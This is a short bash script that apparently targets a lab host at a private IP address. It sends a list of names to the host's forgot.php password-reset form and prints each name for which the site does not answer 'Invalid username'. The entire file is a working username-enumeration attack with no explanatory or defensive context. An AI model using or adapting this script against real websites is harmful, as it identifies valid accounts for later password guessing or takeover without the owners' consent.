#!/bin/bash
cat names.txt | while read x; do
	curl -s -d "username=$x&reset=Reset" 'http://172.17.1.93/forgot.php' | grep -qi "Invalid username" || echo "Username is $x"
done
